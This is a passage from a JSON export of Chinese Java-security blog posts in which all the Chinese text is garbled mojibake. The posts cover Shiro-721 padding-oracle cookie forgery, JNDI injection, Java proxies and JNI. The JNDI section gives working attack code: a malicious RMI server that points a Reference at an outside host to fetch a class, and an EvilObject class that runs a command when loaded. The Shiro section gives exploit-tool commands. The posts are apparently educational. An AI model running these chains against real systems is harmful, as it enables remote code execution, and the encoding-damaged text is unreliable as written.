ä¸­äº†ã€‚ä½†æ˜¯åªè¦æˆ‘ä»¬è·å¾—ä¸€ä¸ªremembermeç”¨æˆ·çš„cookieåå°±å¯ä»¥é€šè¿‡padding oracle attack ä¼ªé€ ä»»æ„cookieå‘è¿‡å»äº†ï¼Œä»è€Œé€ æˆååºåˆ—åŒ–æ¼æ´äº† ç¯å¢ƒæ­å»ºåœ¨è¿™é‡Œä¸‹è½½1.4.1çš„waråŒ…https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.warï¼Œå¹¶æ”¾å…¥tomcat webappsæ–‡ä»¶å¤¹ï¼Œéšåå¯åŠ¨tomcatï¼Œè®¿é—®http://127.0.0.1:8080/samples-web-1.4.1/ åˆ©ç”¨å¤§è‡´é€»è¾‘ä¸shiro-550å·®ä¸å¤šï¼Œç›´æ¥è¯´åˆ©ç”¨å§ã€‚ https://github.com/inspiringz/Shiro-721 ä½¿ç”¨è¿™ä¸ªå·¥å…· é¦–å…ˆæˆ‘ä»¬å¾—å‹¾é€‰remembermeï¼ŒæŠ“åŒ…è·å¾—rememberme cookie ç„¶åé€šè¿‡ysoserialç”Ÿæˆpayloadï¼Œå°†å…¶é€šè¿‡ç®¡é“ç¬¦ä¼ å…¥æŸä¸ªæ–‡ä»¶ï¼Œéšåç”¨åˆšåˆšé‚£ä¸ªå·¥å…·é‡Œçš„shiro_exp.py python .&#x2F;shiro_exp.py &lt;url&gt; &lt;cookie&gt; &lt;paylaodæ–‡ä»¶&gt; éšåä¼šè¿›è¡Œçˆ†ç ´ï¼Œæœ€åè·å¾—ç»“æœcookieåï¼Œä¼ å…¥å¹¶å‘åŒ…è¿‡å»å³å¯ï¼ˆçˆ†ç ´æ—¶é—´å¾ˆé•¿ï¼‰","categories":[],"tags":[{"name":"javaå¼€å‘ä¸å®‰å…¨","slug":"javaå¼€å‘ä¸å®‰å…¨","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"JNDIæ³¨å…¥åŸç†æµ…æ","slug":"JNDIæ³¨å…¥åŸç†æµ…æ","date":"2021-06-28T13:51:11.045Z","updated":"2021-06-28T13:50:45.147Z","comments":true,"path":"2021/06/28/JNDIæ³¨å…¥åŸç†æµ…æ/","link":"","permalink":"http://const27.com/2021/06/28/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/","excerpt":"","text":"JNDIæ³¨å…¥ä¾èµ–RMIï¼Œæ‰€ä»¥åœ¨å­¦ä¹ JNDIæ³¨å…¥å‰åŠ¡å¿…äº†è§£ä¸€ä¸‹RMI JNDI ç®€ä»‹JNDI (Java Naming and Directory Interface) æ˜¯ä¸€ä¸ªjavaä¸­çš„æŠ€æœ¯ï¼Œç”¨äºæä¾›ä¸€ä¸ªè®¿é—®å„ç§èµ„æºçš„æ¥å£ã€‚æ¯”å¦‚é€šè¿‡JNDIå¯ä»¥åœ¨å±€åŸŸç½‘ä¸Šå®šä½ä¸€å°æ‰“å°æœºï¼Œæˆ–è€…å®šä½æ•°æ®åº“æœåŠ¡ï¼Œè¿œç¨‹JAVAå¯¹è±¡ç­‰ã€‚JNDIåº•å±‚æ”¯æŒRMIè¿œç¨‹å¯¹è±¡ï¼ŒRMIæ³¨å†Œçš„æœåŠ¡å¯ä»¥ç›´æ¥è¢«JNDIæ¥å£è®¿é—®è°ƒç”¨ã€‚ JNDIæ³¨å…¥RMIå·¥ä½œåŸç†é¦–å…ˆæˆ‘ä»¬å…ˆæ€è€ƒä¸€ä¸‹RMIçš„å·¥ä½œåŸç†æ˜¯ä»€ä¹ˆã€‚ 1.æœåŠ¡å™¨åˆ›å»ºå¥½ç»§æ‰¿äºRemoteæ¥å£çš„ç±»ï¼Œå¹¶æŠŠå®ƒç»‘å®šåˆ°RMIæœåŠ¡å™¨ä¸Š2.å®¢æˆ·ç«¯è¯·æ±‚RMIæœåŠ¡å™¨ä¸Šçš„ç±»3.æœåŠ¡ç«¯è¿”å›å®¢æˆ·ç«¯æ‰€è¯·æ±‚ç±»çš„å­˜æ ¹stubï¼Œå®¢æˆ·ç«¯å°†è¿™ä¸ªstubçœ‹ä½œå®ä¾‹åŒ–å¯¹è±¡ä½¿ç”¨4.å®¢æˆ·ç«¯è°ƒç”¨stubçš„æŸä¸ªæ–¹æ³•ï¼Œå¹¶ä¼ å…¥å‚æ•°ã€‚è¯¥å‚æ•°ä¼šå‘é€åˆ°RMIæœåŠ¡å™¨ä¸Šï¼Œç”±RMIæœåŠ¡å™¨æŒ‰ç…§å®¢æˆ·ç«¯ä¼ æ¥çš„å‚æ•°æ¥æ‰§è¡ŒæŒ‡å®šçš„æ–¹æ³•5.æœåŠ¡å™¨æ‰§è¡Œå®Œåå°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ æ‰€ä»¥ä»RMIè¿™ä¸€ç«¯æ¥çœ‹ï¼Œå®¢æˆ·ç«¯è·å–äº†è¿œç¨‹å¯¹è±¡åæ‰€æ‰§è¡Œçš„æ­¤å¯¹è±¡çš„æ–¹æ³•ï¼Œéƒ½æ˜¯ç”±RMIæœåŠ¡å™¨æ¥æ‰§è¡Œçš„ã€‚ JNDI ä¸ RMI çš„åŒºåˆ«rmiè°ƒç”¨è¿œç¨‹å¯¹è±¡å’ŒJNDIè°ƒç”¨è¿œç¨‹å¯¹è±¡ï¼Œåœ¨ä»£ç ä¸Šæ˜¯æœ‰å·®åˆ«çš„ å¦‚ä¸‹æ˜¯RMIåˆ›å»ºå’Œè°ƒç”¨è¿œç¨‹å¯¹è±¡ import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.Properties;import java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;interface IHello extends Remote &#123; public String sayHello(String name) throws RemoteException;&#125;class IHelloImpl extends UnicastRemoteObject implements IHello &#123; protected IHelloImpl() throws RemoteException &#123; super(); &#125; public String sayHello(String name) throws RemoteException &#123; return &quot;Hello &quot; + name + &quot; ^_^ &quot;; &#125;&#125;public class CallService &#123; public static void main(String args[]) throws Exception &#123; IHello hello &#x3D; new IHelloImpl(); Naming.bind(&quot;hello&quot;, hello); IHello rHello &#x3D; (IHello) Naming.lookup(&quot;hello&quot;); System.out.println(rHello.sayHello(&quot;RickGray&quot;)); &#125;&#125; è€ŒJNDIè°ƒç”¨è¿œç¨‹å¯¹è±¡çš„è¿‡ç¨‹å¦‚ä¸‹ï¼Œå¤šäº†ä¸€æ­¥è®¾ç½®JNDIç¯å¢ƒ import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.Properties;import java.rmi.registry.Registry;import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;interface IHello extends Remote &#123; public String sayHello(String name) throws RemoteException;&#125;class IHelloImpl extends UnicastRemoteObject implements IHello &#123; protected IHelloImpl() throws RemoteException &#123; super(); &#125; public String sayHello(String name) throws RemoteException &#123; return &quot;Hello &quot; + name + &quot; ^_^ &quot;; &#125;&#125;public class CallService &#123; public static void main(String args[]) throws Exception &#123; &#x2F;&#x2F; é…ç½® JNDI é»˜è®¤è®¾ç½® Properties env &#x3D; new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;localhost:1022&quot;); Context ctx &#x3D; new InitialContext(env); &#x2F;&#x2F; æœ¬åœ°å¼€å¯ 1022 ç«¯å£ä½œä¸º RMI æœåŠ¡ï¼Œå¹¶ä»¥æ ‡è¯† &quot;hello&quot; ç»‘å®šæ–¹æ³•å¯¹è±¡ Registry registry &#x3D; LocateRegistry.createRegistry(1022); IHello hello &#x3D; new IHelloImpl(); registry.bind(&quot;hello&quot;, hello); &#x2F;&#x2F; JNDI è·å– RMI ä¸Šçš„æ–¹æ³•å¯¹è±¡å¹¶è¿›è¡Œè°ƒç”¨ IHello rHello &#x3D; (IHello) ctx.lookup(&quot;hello&quot;); System.out.println(rHello.sayHello(&quot;tom&quot;)); &#125;&#125; Referenceç±»é¦–å…ˆæ¥çœ‹ä¸€ä¸‹å¦‚ä½•åˆ›å»ºä¸€ä¸ªå¯¹è±¡Referenceå¹¶å°†å…¶ç»‘å®šåˆ°RMIæœåŠ¡å™¨ä¸Š ......å®šä¹‰å¥½äº†registryï¼Œå®ƒæ˜¯ä¸€ä¸ªRegistryå¯¹è±¡ï¼ˆRMIä¸­ç”¨äºå°†ç±»æ³¨å†Œåˆ°æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ï¼‰Reference refObj &#x3D; new Reference(&quot;refClassName&quot;, &quot;insClassName&quot;, &quot;http:&#x2F;&#x2F;a.com:12345&quot;);ReferenceWrapper refObjWrapper &#x3D; new ReferenceWrapper(refObj);registry.bind(&quot;refObj&quot;, refObjWrapper); å‰é¢è¯´åˆ°RMIæœåŠ¡å™¨ä¼šå‘å®¢æˆ·ç«¯è¿”å›stubæˆ–è€…è¯´ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœRMIæœåŠ¡å™¨ä¼ å›å®¢æˆ·ç«¯ä¸€ä¸ªReferenceå¯¹è±¡å‘¢ï¼Ÿé‚£å°±è¦è¯´é“è¯´é“äº†ã€‚å¯¹äºRMIæœåŠ¡å™¨è€Œè¨€ï¼Œå‘å®¢æˆ·ç«¯ä¼ å›ä¸€ä¸ªReferenceå¯¹è±¡å’Œä¼ å›å…¶ä»–å¯¹è±¡ä¸€æ ·ï¼Œå¹¶æ²¡æœ‰å¤šå¤§åŒºåˆ«ã€‚ä½†æ˜¯å®¢æˆ·ç«¯ç”±äºè·å–åˆ°äº†ä¸€ä¸ªReferenceå®ä¾‹ï¼Œæ¯”å¦‚è¯´å°±æ˜¯ä¸Šé¢ä»£ç ä¸­çš„Referenceå®ä¾‹ï¼Œæ¥ä¸‹æ¥å®¢æˆ·ç«¯å°±ä¼šå…ˆåœ¨CLASSPATHé‡Œå¯»æ‰¾è¢«æ ‡è¯†ä¸ºrefClassNameçš„ç±»ã€‚å¦‚æœæ²¡æ‰¾åˆ°ï¼Œå®ƒå°±ä¼šå»è¯·æ±‚http://a.com:12345/refClassName.class å¯¹é‡Œé¢çš„ç±»è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œå¹¶è°ƒç”¨insClassNameç±»çš„æ„é€ æ–¹æ³•ã€‚æ³¨æ„ï¼Œè°ƒç”¨insClassNameç±»çš„æ„é€ æ–¹æ³•è¿™ä¸ªè¡Œä¸ºæ˜¯ç”±å®¢æˆ·ç«¯å®Œæˆçš„ã€‚ ä¸Šé¢çš„ä¸€ç³»åˆ—è¡Œä¸ºå¯ä»¥æ¦‚æ‹¬ä¸ºxiatu JNDI åè®®è½¬æ¢æˆ‘ä»¬åœ¨é€šè¿‡JNDIè°ƒç”¨è¿œç¨‹å¯¹è±¡æ—¶ï¼Œéœ€è¦è®¾ç½®ç¯å¢ƒï¼Œå°±åƒè¿™æ · Properties env &#x3D; new Properties();env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;); &#x2F;&#x2F;è®¾ç½®äº†rmiè¯·æ±‚æ–¹å¼env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);Context ctx &#x3D; new InitialContext(env); æ¯”å¦‚ä»¥ä¸Šä»£ç ï¼Œå°±è®¾ç½®äº†JNDIä¼šé€šè¿‡rmiçš„æ–¹å¼å»è¯·æ±‚è¿œç¨‹å¯¹è±¡ã€‚ ä½†æ˜¯å½“è°ƒç”¨lookup()æˆ–è€…search()æ—¶ï¼Œå¯ä»¥ç›´æ¥æ— è§†ç¯å¢ƒæ˜¯å¦‚ä½•è®¾ç½®è¯·æ±‚æ–¹å¼çš„ï¼Œå› ä¸ºJNDIæœ‰åè®®åŠ¨æ€è½¬æ¢æœºåˆ¶ã€‚ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿçœ‹çœ‹ä»£ç å°±æ™“å¾—äº† Properties env &#x3D; new Properties();env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);Context ctx &#x3D; new InitialContext(env);ctx.lookup(&quot;ldap:&#x2F;&#x2F;a.com&#x2F;ou&#x3D;foo,dc&#x3D;foobar,dc&#x3D;com&quot;) ä»¥ä¸Šä»£ç æ‰§è¡Œåï¼Œä¼šè°ƒç”¨ldapåè®®å»è¯·æ±‚ï¼Œè€Œä¸æ˜¯rmiã€‚è¿™æ˜¯å› ä¸ºlookupæˆ–è€…searchå‡½æ•°åœ¨å‚æ•°ä¸ºç»å¯¹è·¯å¾„URIçš„æƒ…å†µä¸‹åŠ¨æ€è½¬æ¢åè®®ä¸ºå‚æ•°ä¸­æŒ‡å®šçš„åè®®ã€‚ JNDIæ³¨å…¥å¦‚æœæˆ‘ä»¬æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼ŒJNDIæ³¨å…¥å°±ä¼šæˆåŠŸ JNDIè°ƒç”¨çš„lookupå‚æ•°å¯æ§URIå¯è¿›è¡ŒåŠ¨æ€åè®®è½¬æ¢Referenceå¯¹è±¡æŒ‡å®šç±»ä¼šè¢«åŠ è½½å¹¶å®ä¾‹åŒ– å…¶å®æœ€é‡è¦çš„å°±æ˜¯ç¬¬ä¸€æ¡ã€‚ ä¸‹é¢ç”¨ä¸€å¼ å›¾æ¦‚æ‹¬ä»JNDIæ³¨å…¥åˆ°RCEçš„æµç¨‹ 1.æ”»å‡»è€…æ§åˆ¶äº†lookupå‚æ•°2.æ”»å‡»è€…å°†lookupå‚æ•°æ›¿æ¢ä¸ºå»è¯·æ±‚æ¶æ„æœåŠ¡å™¨Aä¸Šçš„Referenceå¯¹è±¡3.æ¶æ„æœåŠ¡å™¨Aè¿”å›Referenceå¯¹è±¡4.å—å®³æœºå™¨è·å¾—Referenceå¯¹è±¡åå…ˆåœ¨CLASSPATHä¸­æŸ¥æ‰¾Referenceå¯¹è±¡ä¸­çš„æŒ‡å®šç±»æ˜¯å¦å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨åˆ™è¯·æ±‚Referenceå¯¹è±¡ä¸­æŒ‡å®šçš„æ¶æ„æœåŠ¡å™¨Bå»è·å¾—æŒ‡å®šç±»5.æ¶æ„æœåŠ¡å™¨Bè¿”å›æŒ‡å®šç±»6.å—å®³æœºå™¨å¾—åˆ°æŒ‡å®šç±»åï¼Œæ‰§è¡ŒæŒ‡å®šç±»çš„æ„é€ å‡½æ•°ï¼Œä»è€Œè¾¾åˆ°RCE ä¸‹é¢æ˜¯ä»£ç å®ç° å—å®³æœºå™¨ import java.rmi.Remote;import java.rmi.RemoteException;import javax.naming.Context;import javax.naming.InitialContext;interface IHello extends Remote &#123; abstract String sayHello(String name) throws RemoteException;&#125;public class CallService &#123; public static void main(String args[]) throws Exception&#123; if(args.length&lt;1)&#123; System.out.println(&quot;Plz input url&quot;); System.exit(-1); &#125; else &#123; &#x2F;&#x2F; JNDI è·å– RMI ä¸Šçš„æ–¹æ³•å¯¹è±¡å¹¶è¿›è¡Œè°ƒç”¨ Context ctx &#x3D; new InitialContext(); IHello rHello &#x3D; (IHello) ctx.lookup((String)args[0]); System.out.println(rHello.sayHello(&quot;tom&quot;)); &#125; &#125;&#125; RMI import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.*;import java.rmi.server.UnicastRemoteObject;public class evilrmi &#123; public static void main(String[] args) throws Exception&#123; Registry registry &#x3D; LocateRegistry.createRegistry(1010); Reference refObj &#x3D; new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http:&#x2F;&#x2F;192.168.111.1:80&#x2F;&quot;); ReferenceWrapper refObjWra &#x3D; new ReferenceWrapper(refObj); registry.bind(&quot;refObj&quot;,refObjWra); System.out.println(&quot;gogo&quot;); &#125;&#125; EvilObject import java.lang.Runtime;import java.lang.Process;public class EvilObject &#123; public EvilObject() throws Exception &#123; Runtime rt &#x3D; Runtime.getRuntime(); String[] commands &#x3D; &#123;&quot;calc&quot;&#125;; Process pc &#x3D; rt.exec(commands); pc.waitFor(); &#125;&#125; æˆ‘ä»¬å…ˆè¿è¡ŒRMIæœåŠ¡å™¨ï¼Œç„¶åæŠŠEvilObject.classæ”¾ç½®äºhttp://192.168.111.1:80/ä¸‹ï¼Œç„¶åæŒ‡å®šlookupå‚æ•°ä¸ºæˆ‘ä»¬çš„æ¶æ„RMIæœåŠ¡å™¨å»è¿è¡Œå—å®³æœºå™¨ã€‚ å¦‚æœæ˜¯æ—©æœŸJDKç‰ˆæœ¬ï¼Œè®¡ç®—å™¨å°±å·²ç»å¼¹å‡ºæ¥äº†ã€‚JDK 6u141, JDK 7u131, JDK 8u121 ä»¥åŠæ›´é«˜ç‰ˆæœ¬ä¸­Javaæå‡äº†JNDI é™åˆ¶äº†Naming/DirectoryæœåŠ¡ä¸­JNDI Referenceè¿œç¨‹åŠ è½½Object Factoryç±»çš„ç‰¹æ€§ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œä»¥ä¸Šæµç¨‹ä¼šæœ‰å¦‚ä¸‹æŠ¥é”™ The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;. ç³»ç»Ÿå±æ€§ com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚ ä»¥ä¸Šæ˜¯JNDI Reference+RMIçš„åˆ©ç”¨æ–¹å¼ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªJNDI Reference+ldap çš„åˆ©ç”¨æ–¹å¼ï¼Œæ“ä½œä¸JNDI Reference+RMIå¤§åŒå°å¼‚ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ldapåè®®lookupä¸€ä¸ªæ¶æ„æœåŠ¡å™¨å¹¶è·å¾—æ¶æ„Referenceå¯¹è±¡ï¼Œå¹¶ä¸”LDAPæœåŠ¡çš„Referenceè¿œç¨‹åŠ è½½Factoryç±»ä¸å— com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebaseç­‰å±æ€§çš„é™åˆ¶ï¼Œæ‰€ä»¥åˆ©ç”¨é¢æ›´å¹¿ä½†æ˜¯åœ¨Oracle JDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å com.sun.jndi.ldap.object.trustURLCodebase å±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸ºfalseï¼Œè¿˜å¯¹åº”çš„åˆ†é…äº†ä¸€ä¸ªæ¼æ´ç¼–å·CVE-2018-3149ã€‚ JNDIæ³¨å…¥ï¼šé«˜ç‰ˆæœ¬å¦‚ä½•åˆ©ç”¨ï¼Ÿ","categories":[],"tags":[{"name":"javaå¼€å‘ä¸å®‰å…¨","slug":"javaå¼€å‘ä¸å®‰å…¨","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"javaå®‰å…¨ä¸­å‡ ä¸ªé‡è¦æœºåˆ¶","slug":"javaå®‰å…¨ä¸­é‡è¦çš„å‡ ä¸ªæœºåˆ¶","date":"2021-06-28T13:51:11.042Z","updated":"2021-03-31T06:02:07.803Z","comments":true,"path":"2021/06/28/javaå®‰å…¨ä¸­é‡è¦çš„å‡ ä¸ªæœºåˆ¶/","link":"","permalink":"http://const27.com/2021/06/28/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/","excerpt":"","text":"java ä»£ç†ä»£ç†çš„ä½œç”¨ï¼Œå°±æ˜¯åœ¨åŸæœ‰ç±»çš„ä»£ç ä¸å‘ç”Ÿæ”¹åŠ¨çš„æƒ…å†µä¸‹ï¼Œæ·»åŠ æ–°åŠŸèƒ½ã€‚èµ·åˆ°ä¸€ä¸ªä¿®é¥°å™¨çš„ä½œç”¨ã€‚ å‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰ä¸ªç±»ï¼Œç”¨äºæ‰“å°helloworld class hello&#123; public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;&#125; æˆ‘ä»¬æƒ³åœ¨ä¸æ”¹åŠ¨helloç±»çš„å‰æä¸‹ï¼Œåœ¨è¾“å‡ºhelloworldæ—¶åŒæ—¶è¾“å‡ºå½“å‰æ—¶é—´åˆ°æ–‡ä»¶ï¼Œè¾¾åˆ°æ—¥å¿—çš„åŠŸèƒ½ï¼Œè¯¥å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿä»¥è¿™ä¸ªé—®é¢˜ä¸ºåˆ‡å…¥ç‚¹ï¼Œå¼€å§‹å­¦ä¹ ä»£ç†ã€‚ é™æ€ä»£ç†é™æ€ä»£ç†å¾ˆç®€å•ï¼Œä¸ç”¨æ¥è§¦ä»€ä¹ˆæ–°æŠ€æœ¯ã€‚å°±æ˜¯åˆ›å»ºä¸€ä¸ªâ€ç»§æ‰¿å·²æœ‰çš„ä¸€ä¸ªç±»â€œçš„ç±»ï¼Œé€šè¿‡é‡å†™çˆ¶ç±»çš„æ–¹æ³•ï¼Œè¾¾åˆ°ä¸æ”¹åŠ¨åŸæœ‰ç±»çš„åŸºç¡€ä¸Šå¢æ·»æ–°åŠŸèƒ½ã€‚çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç”¨ä»£ç æ¥è¯´æ˜ä¸€ä¸‹å§ã€‚ ä»¥åˆšåˆšçš„è¾“å‡ºhelloworldçš„ç±»ä¸ºä¾‹ã€‚æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªå®ƒçš„å­ç±»ï¼Œå¹¶åœ¨å…¶ä¸­é‡å†™å…¶gogoæ–¹æ³•ï¼Œæ·»åŠ æ—¥å¿—ç”ŸæˆåŠŸèƒ½ class hello&#123; public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;&#125;class static_hello_proxy extends hello&#123; hello hello_obj; static_hello_proxy(hello hello)&#123; this.hello_obj &#x3D; hello; &#125; @Override public void gogo()&#123; log(); hello_obj.gogo(); &#125; public void log()&#123; Date date &#x3D; new Date(); String value &#x3D; &quot;date:&quot;+date+&quot;\\n&quot;; FileWriter writer &#x3D; null; try &#123; writer &#x3D; new FileWriter(new File(&quot;log.txt&quot;),true); writer.write(value); writer.flush(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; ç„¶åä¸»å‡½æ•°ä¸­æˆ‘ä»¬åªéœ€è°ƒç”¨static_hello_proxyä¸­çš„gogo()æ–¹æ³•å°±èƒ½è¾¾åˆ°æ—¥å¿—åŠŸèƒ½äº†ã€‚è¿™å°±æ˜¯é™æ€ä»£ç†ã€‚é™æ€ä»£ç†çš„ç¼ºç‚¹æ˜¾è€Œæ˜“è§ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä»£ç†ä¸åŒçš„ç±»ï¼Œå°±è¦å†™å‡ºä¸åŒçš„é™æ€ä»£ç†ç±»å‡ºæ¥ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯èƒ½ä¼šé‡åˆ°éœ€è¦å¤šä¸ªä»£ç†ç±»æ¥å¢æ·»å®ç°ä¸€ä¸ªç±»çš„ä¸åŒåŠŸèƒ½ï¼Œæœ‰éœ€è¦å®šä¹‰ä¸€å¤§å †ç±»å‡ºæ¥ã€‚ä¸å®¹æ˜“ç»´æŠ¤ï¼Œæ‰€ä»¥åŠ¨æ€ä»£ç†å°±è¯ç”Ÿäº†ï¼Œå®ƒå¾ˆå¥½çš„è§£å†³äº†é™æ€ä»£ç†ä¼šäº§ç”Ÿå¤§é‡ä»£ç†ç±»çš„éš¾é¢˜ã€‚ åŠ¨æ€ä»£ç†ä½¿ç”¨åŠ¨æ€ä»£ç†ï¼Œå¯ä»¥ä¸ç”¨åˆ›å»ºä»£ç†ç±»ï¼Œéå¸¸çš„æ–¹ä¾¿ã€‚ åŠ¨æ€ä»£ç†ç”±Proxy.newProxyInstanceæ–¹æ³•å®ç°ã€‚ æˆ‘ä»¬çœ‹çœ‹å®ƒçš„ä¸‰ä¸ªå‚æ•°ã€‚loaderï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è¢«ä»£ç†ç±»çš„ç±»åŠ è½½å™¨ã€‚interfaces è¢«ä»£ç†ç±»æ‰€éœ€è¦å®ç°çš„æ¥å£ï¼Œå¯é€šè¿‡ ç±»å¯¹è±¡.getinterfaces()è·å¾—h å³ InvocationHandleræ¥å£ç±» çš„å®ç°ç±»ï¼Œç”¨äºå®ç°ä»£ç†å¢æ·»çš„æ–¹æ³• æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ª InvocationHandler ç±»çš„ç»“æ„ã€‚è¿™ä¸ªç±»åªæœ‰ä¸€ä¸ªinvokeæ–¹æ³•ï¼Œä¸”è¿™ä¸ªç±»æ˜¯æ¥å£ç±»ã€‚è¿™ä¸ªinvokeæ–¹æ³•å°±ç”¨äºå­˜æ”¾æˆ‘ä»¬çš„å¢æ·»çš„åŠŸèƒ½ã€‚ proxyå³ä»£ç†å¯¹è±¡ï¼Œmethodå³å¯¹è±¡ä¸­çš„æŸä¸ªæ–¹æ³•ï¼Œargså³æ–¹æ³•ä¸­çš„å‚æ•°ã€‚ okï¼Œæ¥ä¸‹æ¥æŠŠåˆšåˆšé‚£ä¸ªç±»åŠ¨æ€ä»£ç†ä¸€ä¸‹å§ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯åŠ¨æ€ä»£ç†åªèƒ½ä»£ç†æ¥å£å®ç°ç±»ã€‚ import java.io.File;import java.io.FileInputStream;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;import java.util.Date;public class test &#123; public static void main(String[] args)&#123; hello hello_obj &#x3D; new hello(); ClassLoader Loader &#x3D; hello_obj.getClass().getClassLoader(); Class&lt;?&gt;[] Interfaces &#x3D; hello_obj.getClass().getInterfaces(); InvocationHandler ih &#x3D; new InvocationHandler() &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if(method.getName()&#x3D;&#x3D;&quot;gogo&quot;)&#123; FileWriter writer &#x3D; new FileWriter(&quot;log.txt&quot;); writer.write(&quot;date:&quot;+new Date()+&quot;|by åŠ¨æ€ä»£ç†\\n&quot;); writer.flush(); hello_obj.gogo(); &#125; return null; &#125; &#125;; hello_interface proxy &#x3D; (hello_interface) Proxy.newProxyInstance(Loader,Interfaces,ih); &#x2F;&#x2F;æ³¨æ„è¿™é‡Œæ•°æ®ç±»å‹æ˜¯æ¥å£çš„æ•°æ®ç±»å‹ proxy.gogo(); &#125;&#125;interface hello_interface&#123; public void gogo();&#125;class hello implements hello_interface&#123; public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;&#125; OK,ALL DOWN JNIJNIæ˜¯JAVAçš„ä¸€ä¸ªæ¥å£ï¼Œç”¨æ¥å®ç°c/c++è°ƒç”¨ï¼Œä¸ºJAVAæä¾›äº†ä¸€ä¸ªæ“çºµåº•å±‚çš„èƒ½åŠ›ã€‚ JNI HelloWorldjava IDEï¼šidea C IDEï¼švs2019 1.å†™å¥½JAVAæ–‡ä»¶ï¼Œå®šä¹‰å¥½nativeæ–¹æ³•ã€‚ public class test &#123; static&#123; System.loadLibrary(&quot;Dll1&quot;); &#125; public native void hello(); public static void main(String[] args) &#123; test a &#x3D; new test(); a.hello(); &#125;&#125; 2.ä½¿ç”¨javacæŒ‡ä»¤ä¸ºjavaæ–‡ä»¶çš„å„nativeæ–¹æ³•ç”Ÿæˆcè¯­è¨€å¤´æ–‡ä»¶ã€‚ javac -cp . test.java -h . æ‰§è¡Œåä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¤´æ–‡ä»¶ 3.ç”¨vscodeåˆ›å»ºä¸€ä¸ªdllé¡¹ç›®ï¼Œå°†test.hä¸jdk includeç›®å½•ä¸‹çš„jni.hä»¥åŠjdk/include/win32/jni_md.hç»Ÿç»Ÿç§»åŠ¨åˆ°é¡¹ç›®æ–‡ä»¶ç›®å½•ä¸‹ã€‚ç„¶ååœ¨vscodeå¤´æ–‡ä»¶é‡Œæ·»åŠ ç°æœ‰é¡¹ï¼ŒæŠŠåˆšåˆšæ”¾åˆ°é¡¹ç›®æ–‡ä»¶ä¸‹çš„3ä¸ªå¤´æ–‡ä»¶æ·»åŠ è¿›å»ã€‚ 4.åœ¨cæˆ–c++ä¸­å®šä¹‰nativeæ–¹æ³•çš„c/c++åŸå‹ã€‚ é€šè¿‡test.hæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“ªäº›æ–¹æ³•éœ€è¦æˆ‘ä»¬å®šä¹‰ã€‚è¿™é‡Œæ˜¯Java_test_helloæ–¹æ³•ã€‚ æˆ‘ä»¬éšä¾¿å®šä¹‰ä¸€ä¸‹ #include 